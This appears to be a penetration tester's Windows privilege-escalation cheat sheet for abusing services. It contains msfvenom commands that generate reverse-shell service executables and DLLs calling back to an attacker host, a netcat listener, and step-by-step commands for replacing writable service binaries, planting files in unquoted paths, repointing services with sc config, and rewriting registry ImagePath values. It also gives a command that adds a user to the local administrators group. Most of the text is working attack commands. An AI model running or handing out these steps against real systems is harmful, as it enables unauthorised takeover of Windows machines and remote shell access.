# Windows privesc: services

## A payload for a service to run
On Kali, then into the target's upload/ folder for serve:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe-service -o svc.exe
rlwrap nc -lvnp <LPORT>
- [ ] Fetched to C:\Users\Public\svc.exe on the target, with the line serve files gives

## Find one I can change
Unquoted paths with a space, outside C:\Windows:
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'C:\\Windows' } | Select-Object Name, PathName, StartMode
Every service's program, to check each one's folder with icacls:
Get-CimInstance Win32_Service | Select-Object Name, StartName, PathName | Format-List
Services I can reconfigure:
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv '<Username>' *
- [ ] winPEAS lists all three: peass-ng's winPEASx64.exe, from serve

## Check one service
sc.exe qc <Service>
sc.exe query <Service>
sc.exe sdshow <Service>
icacls "THE-PROGRAM-PATH"
- [ ] It runs as LocalSystem, from SERVICE_START_NAME, and THE-PROGRAM-PATH is its BINARY_PATH_NAME
- [ ] I can stop and start it, or it starts automatically and I may reboot: shutdown /r /t 0
- [ ] icacls shows (F), (M) or (W) for Users, Everyone, Authenticated Users or me

## Writable program: replace it
move "THE-PROGRAM-PATH" C:\Users\Public\service.bak
copy C:\Users\Public\svc.exe "THE-PROGRAM-PATH"
sc.exe stop <Service>
sc.exe start <Service>

## Unquoted path: plant the first gap
- [ ] For C:\Program Files\My App\Common Files\app.exe, Windows tries C:\Program.exe, then C:\Program Files\My.exe, then C:\Program Files\My App\Common.exe
- [ ] icacls on each folder in turn, for the first one I can write
copy C:\Users\Public\svc.exe "C:\Program Files\My App\Common.exe"
sc.exe stop <Service>
sc.exe start <Service>

## Weak service permissions: point it at mine
The space after each = matters: binpath="..." silently fails.
sc.exe config <Service> binpath= "C:\Users\Public\svc.exe"
When it runs as another account, from cmd.exe, since PowerShell drops the empty password:
sc.exe config <Service> obj= ".\LocalSystem" password= ""
sc.exe stop <Service>
sc.exe start <Service>
Or an administrator instead of a shell (start reports an error, and the command still runs):
sc.exe config <Service> binpath= "cmd /c net localgroup administrators <Username> /add"

## Weak registry permissions
accesschk.exe /accepteula -uwqvk HKLM\System\CurrentControlSet\Services\<Service>
reg add HKLM\SYSTEM\CurrentControlSet\Services\<Service> /v ImagePath /t REG_EXPAND_SZ /d C:\Users\Public\svc.exe /f
net start <Service>

## A DLL it loads from a folder I can write
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o <File>
- [ ] The DLL's name from Process Monitor on my own Windows: NAME NOT FOUND, path ending .dll
- [ ] THE-FOLDER is the writable folder it searches, from icacls
Fetched with the line serve files gives, then:
copy C:\Users\Public\<File> "THE-FOLDER\<File>"
sc.exe stop <Service>
sc.exe start <Service>

## Afterwards
- [ ] The original program, path or registry value put back: a broken service may not start again
